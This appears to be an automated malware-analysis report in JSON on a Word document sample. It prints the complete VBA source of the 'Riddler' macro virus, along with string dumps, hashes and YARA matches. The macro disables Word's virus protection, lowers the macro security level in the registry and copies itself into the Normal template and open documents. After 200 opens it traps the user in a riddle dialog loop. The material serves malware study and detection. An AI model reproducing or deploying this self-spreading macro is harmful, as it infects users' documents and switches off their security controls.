{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"Riddler\""
        ],
        "behavior": {
            "AutoOpen": "Runs when the Word document is opened",
            "Call": "May call a DLL using Excel 4 Macros",
            "Environ": "May read system environment variables",
            "Kill": "May delete a file",
            "System": "May run an executable file or a system command on a Mac",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "Windows": "May enumerate application windows"
        },
        "macro": "\n\n\nSub AutoOpen()\n    'Riddler Virus v1.00\n    'The WaLRuS 05/00\n    On Error Resume Next\n    Options.ConfirmConversions = False\n    Options.VirusProtection = False\n    Options.SaveNormalPrompt = False\n    CommandBars(\"Macro\").Controls(\"Security...\").Enabled = False\n    System.PrivateProfileString(\"\", \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security\", \"Level\") = 1&\n    ActiveDocument.ReadOnlyRecommended = False\n    System.PrivateProfileString(\"\", \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\", \"RegisteredOwner\") = \"The WaLRuS\"\n    Set Norm = NormalTemplate.VBProject.VBComponents\n    Set Doc = ActiveDocument.VBProject.VBComponents\nIf Norm.Item(\"Riddler\").Name <> \"Riddler\" Then\n    Doc(\"Riddler\").Export \"c:\\Riddler.sys\"\n    Set infect = NormalTemplate.VBProject\nElseIf Doc.Item(\"Riddler\").Name <> \"Riddler\" Then\n    Norm(\"Riddler\").Export \"c:\\Riddler.sys\"\n    Set infect = ActiveDocument.VBProject\nEnd If\ninfect.VBComponents.Import (\"c:\\Riddler.sys\")\nKill (\"c:\\Riddler.sys\")\nActiveDocument.Save\nCall PayloadCounter\nEnd Sub\n\nSub PayloadCounter()\nOn Error Resume Next\nDim sCounter As String\nDim sFileName As String\n\n  sFileName = Environ(\"Windir\")\n  If Right(sFileName, 1) <> \"\\\" Then\n    sFileName = sFileName & \"\\\"\n  End If\n  sFileName = sFileName & \"WIN.INI\"\n\n  sCounter = System.PrivateProfileString(sFileName, \"Riddler\", \"Counter\")\n  If Val(sCounter) <> \"200\" Then\n    sCounter = Val(sCounter) + 1\n    System.PrivateProfileString(sFileName, \"Riddler\", \"Counter\") = sCounter\n  Else\n    MsgBox \"Hello there \" & Application.UserName & vbCr & \"I wont let you continue until you\" & vbCr & \"answer Me these riddles Three.\" & vbCr & vbCr & \"Please enter in lower case only\", 0, \"Riddler\"\n    Call FirstRiddle\n  End If\nEnd Sub\n\nSub FirstRiddle()\nOn Error Resume Next\nRiddle1 = InputBox(\"He has a look of awful scorn, \" & vbCr & \"And wears his clothes a funny way, \" & vbCr & \"Waving his hands over fields of corn, \" & vbCr & \"He keeps the birds away! \", \"A Simple One To Start\")\nIf Riddle1 = \"scarecrow\" Then\nMsgBox \"Correct\", 0, \"Correct, on to riddle 2\"\nCall SecondRiddle\nElse: MsgBox \"Oh Dear, Try again, Help can be found at http://www1.tpgi.com.au/users/aali/riddles_galore.html\", 0, \"Incorrect\"\nCall PayloadCounter\nEnd If\nEnd Sub\n\nSub SecondRiddle()\nOn Error Resume Next\nRiddle2 = InputBox(\"The man who invented it, doesn't want it. \" & vbCr & \"The man who bought it, doesn't need it. \" & vbCr & \"The man who needs it, doesn't know it. \", \"Getting Harder\")\nIf Riddle2 = \"coffin\" Then\nMsgBox \"Correct, Just 1 more riddle\", 0, \"Correct\"\nCall ThirdRiddle\nElse: MsgBox \"Oh Dear, Start again\", 0, \"Incorrect\"\nCall PayloadCounter\nEnd If\nEnd Sub\n\nSub ThirdRiddle()\nOn Error Resume Next\nRiddle3 = InputBox(\"What goes around the world but stays in a corner? \", \"Even Harder\")\nIf Riddle3 = \"stamp\" Then\nMsgBox \"Very Good 3 out of 3\" & vbCr & \"You may continue\", 0, \"Correct\"\n\nDim sCounter As String\nDim sFileName As String\n\n  sFileName = Environ(\"Windir\")\n  If Right(sFileName, 1) <> \"\\\" Then\n    sFileName = sFileName & \"\\\"\n  End If\n  sFileName = sFileName & \"WIN.INI\"\n\n  sCounter = System.PrivateProfileString(sFileName, \"Riddler\", \"Counter\")\n    sCounter = Val(sCounter) + 1\n    System.PrivateProfileString(sFileName, \"Riddler\", \"Counter\") = sCounter\nElse: MsgBox \"Oh You were so close. Start again ;-)\", 0, \"Incorrect\"\nCall PayloadCounter\nEnd If\nEnd Sub\n\nSub HelpAbout()\n    MsgBox \"Riddler by The WaLRuS\", 0, \"The Shadow Knows...\"\nEnd Sub\n\n' basic stealth\nSub ToolsMacro()\nEnd Sub\nSub FileTemplates()\nEnd Sub\nSub ViewVBCode()\nEnd Sub\n"
    },
    "filename": "VirusShare_03b0476a68ea8f21184697a58478530d",
    "filesize": 33280,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.10, Code page: 1252, Author: ..... ........., Template: normal.dot, Last Saved By: ..... ........., Revision Number: 1, Name of Creating Application: Microsoft Word 9.0, Total Editing Time: 01:00, Create Time/Date: Thu May 18 23:47:00 2000, Last Saved Time/Date: Thu May 18 23:48:00 2000, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "03b0476a68ea8f21184697a58478530d",
        "sha1": "3b059461ef6bf685eb8293daf7b7f02ad81ba6fa",
        "sha256": "674ea190047d75dbd900f6853a43d743726f2ea88b439e4a773f4348ab277308"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjU",
            "/ =!",
            "..... .........",
            "normal.dot",
            "..... .........",
            "Microsoft Word 9.0",
            "......... ....... .......",
            "Title",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VGlobal!",
            "Spac",
            "Crea",
            "tabl",
            "Pre decla",
            "BExp",
            "Temp",
            "lateDeri",
            "$Custom",
            "izC1",
            "Y_CURREN",
            "T_USER\\S",
            "oftware\\",
            "fice\\9.0\\Word\\",
            " Level\")",
            "AwveD",
            "ocnt.Re",
            "adOnlyRe\"c",
            "gendQLO",
            "CAL_MACH",
            "INE\\SOFT",
            "WARE",
            ")Win",
            "dows\\Cur`rentV",
            "egiAredOwn",
            "pSet b@2CdT",
            "empl@M.VB",
            "Njq@",
            "dpon",
            ".Ie(\u01af).B<> @(",
            "Export \"c:\\",
            ".sys1inf@+",
            "j\"AF\"G\"nd 0If",
            "C-X.I",
            "m:(:{Kil",
            "Payloa",
            "dCounter?#",
            " As i",
            "= Env@iron(\"aVi",
            "r\"1Righ",
            ", 1) 9AB\\\"A\t\tg",
            "& \"\\\"@E)  ",
            "WIN.INI",
            "= \tNak",
            "Val(e#q",
            "MsgB",
            "oxello ",
            "there \" ",
            "& Applica!.UserB7@& vbCr",
            "I wont lA`you c",
            "nue ",
            "Hil ",
            "answe",
            "r Me",
            "rs`7ree.(",
            "Plea",
            "in lo",
            "o +0",
            "YFirst0",
            "nput$(\"He has a",
            "ok of aw",
            "ful scor.n",
            "AMwe",
            " his cl",
            "funny",
            " way",
            "Wav b",
            "s o`@ field`",
            "keepsA* birp",
            "\"A Si",
            "0Ze One To8art(4q",
            "\"scllwu( CorrRt",
            ", on to",
            " 2`22",
            "@oond",
            ", Try ",
            "agai`",
            "p can be",
            "Gd at ",
            "http://w",
            "ww1.tpgi.0q.au/u's/aali/T#",
            "_galore.html",
            "LLT| ",
            " ev 3",
            "2 Ar",
            " who inv*",
            "d it, do`esn't",
            "t.4E!Y",
            "bou30M:",
            "know",
            "$GettQ$Hard|",
            "\"con",
            ", Just 1< m",
            "?g5g?",
            "Wh`%g",
            "arR&",
            "8@Krld  stay",
            "Fn<;er?3EU",
            "y Good 3 outQA3OYQmay&RN",
            "sleW",
            "s4a\"",
            "= _q?",
            "pge so1",
            "\\se.Ts- ;\\-)",
            "G - PA@t-",
            "x by/",
            "ADSha  K?sA",
            "' basicA",
            ".ealthTo\u0452\u04b1",
            "vP@q ",
            "ViewV BCode",
            "$F^:",
            "Riddler Virus v1.00",
            "The WaLRuS 05/00",
            "Riddle",
            "Security...",
            "Macro",
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security",
            "Level",
            "The WaLRuS",
            "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
            "RegisteredOwner",
            "Riddler",
            "Riddler",
            "c:\\Riddler.sys",
            "Riddler",
            "Riddler",
            "Riddler",
            "c:\\Riddler.sys",
            "Riddler",
            "c:\\Riddler.sys",
            "c:\\Riddler.sys",
            "Windir$",
            "WIN.INI",
            "Riddler",
            "Counter",
            "Riddler",
            "Counter",
            "Hello there  ",
            "I wont let you continue until you",
            "answer Me these riddles Three.",
            "Please enter in lower case only",
            "Riddler",
            "He has a look of awful scorn,  ",
            "And wears his clothes a funny way, ",
            "Waving his hands over fields of corn, ",
            "He keeps the birds away! ",
            "A Simple One To Start",
            "scarecrow",
            "Correct",
            "Correct, on to riddle 2",
            "Oh Dear, Try again, Help can be found at http://www1.tpgi.com.au/users/aali/riddles_galore.html",
            "Incorrect",
            "The man who invented it, doesn't want it.  ",
            "The man who bought it, doesn't need it. ",
            "The man who needs it, doesn't know it. ",
            "Getting Harder$",
            "coffin",
            "Correct, Just 1 more riddle",
            "Correct",
            "Oh Dear, Start again",
            "Incorrect",
            "What goes around the world but stays in a corner? ",
            "Even Harder",
            "stamp",
            "Very Good 3 out of 3 ",
            "You may continue",
            "Correct",
            "Windir$",
            "WIN.INI",
            "Riddler",
            "Counter",
            "Riddler",
            "Counter",
            "Oh You were so close. Start again ;-)",
            "Incorrect",
            "Riddler by The WaLRuS",
            "The Shadow Knows...",
            " basic stealth",
            "Attribut",
            "e VB_Nam",
            "e = \"Rid",
            "dler\"",
            "Sub Aut",
            "oOpen()",
            "rus v1.0",
            "2The Wa",
            "LRuS 05/",
            ",On Erro@r Resu",
            "`Opti",
            "ons.Conf",
            "vers",
            "False",
            "qProtec",
            "$SaveNormal",
            ")mpt",
            "CommandB",
            "ars(\"Mac",
            "ro\")?tro",
            "Securi ty...",
            "En abled Sy",
            "stem.Pri",
            "vate1fil",
            "eString(",
            "\"\", \"HKi",
            "$F^:",
            "DEST",
            "DEST",
            "Wordk",
            "Win16~",
            "Win32",
            "VBA6#",
            "Project1",
            "stdole`",
            "Project-",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Module1b",
            "Riddler",
            "AutoOpen*",
            "Options",
            "ConfirmConversions",
            "VirusProtectionoD",
            "SaveNormalPrompt\u02bc",
            "CommandBars",
            "ControlsK",
            "Enabled\u06ea",
            "Systema",
            "PrivateProfileString[",
            "ActiveDocument\\",
            "ReadOnlyRecommended",
            "NormP>",
            "NormalTemplateq",
            "VBProjectOh",
            "VBComponents",
            "Itemz",
            "Export",
            "infectf",
            "Importi",
            "Kill",
            "Save",
            "PayloadCounter",
            "sCounter",
            "sFileName",
            "Environ",
            "Right",
            "MsgBoxR",
            "Application*",
            "UserName\\",
            "vbCr",
            "FirstRiddle",
            "Riddle1",
            "InputBox",
            "SecondRiddle6",
            "Riddle2",
            "ThirdRiddle\\",
            "Riddle3",
            "HelpAbout>",
            "ToolsMacrou",
            "FileTemplatesuy",
            "ViewVBCode",
            "Documentj",
            "Project",
            "$F^:",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "c2.tlb#O",
            "LE Automation",
            "D@NormalDNABr",
            "*\\C'",
            "!Of(ficfO`f",
            "G{2DF8D0",
            "4C-5BFA-",
            "101B-BDER5fAAd4",
            "fgram F",
            "iles\\Microsoft ",
            "MSO9.D",
            " 9.0",
            " LibraryC",
            "ThisDocumentG",
            ",!g\"B",
            "BRiddlerG",
            "#FdAr",
            "ThisDocument",
            "Riddler",
            "ID=\"{B60B20AE-2D16-11D4-9CDC-444553540000}\"",
            "Document=ThisDocument/&H00000000",
            "Module=Riddler",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "VersionCompatible32=\"393222000\"",
            "CMG=\"3F3DA5E8DB181E1C1E1C1E1C1E1C\"",
            "DPB=\"80821A1D1B1D1B1D\"",
            "GC=\"C1C35B5C5C5C5CA3\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};P",
            "VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "Riddler=0, 0, 0, 0, C",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www1.tpgi.com.au/users/aali/riddles_galore.html",
            "http://w"
        ]
    },
    "time": "0:00:00.335034",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
